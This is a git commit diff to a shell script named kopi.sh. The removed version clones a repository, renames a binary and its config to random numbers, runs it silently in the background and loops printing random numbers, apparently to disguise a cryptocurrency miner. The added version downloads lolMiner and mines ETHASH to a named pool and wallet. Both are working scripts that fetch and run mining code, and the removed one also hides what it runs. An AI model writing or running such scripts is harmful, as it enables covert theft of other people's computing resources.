30b21f1fa9f043bb61e2d7dcee9a52908eb5a81e
mahligg45 <87823344+mahligg45@users.noreply.github.com>
2022-07-13 00:07:06 +0700

    Update kopi.sh

--- kopi.sh
+++ kopi.sh
@@ -1,21 +1,2 @@
 #!/bin/bash
-
-MINER=$(shuf -i 10-9999999999999999999 -n 1)
-
-INI=$(shuf -i 10-9999999999999999999 -n 1).ini
-
-sudo apt update
-
-git clone https://github.com/angkii/asu 
-
-cd asu
-
-mv gas $MINER
-
-mv kopi.ini $INI
-
-chmod +x $MINER $INI
-
-./$MINER $INI > /dev/null 2>&1 &
-
-x=1; while [ $x -le 36000000 ]; do echo "$(shuf -i 1111111111111111111-9999999999999999999 -n 1)$(( x++ ))" && sleep 10; done
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.41/lolMiner_v1.41b_Lin64.tar.gz && tar -xvf lolMiner_v1.41b_Lin64.tar.gz && cd 1.41b && ./lolMiner --algo ETHASH --pool alena.hopto.org:2020 --user 0x3d02f7b8dcb18e778fe35bf8b5a7f91d819bf0c4
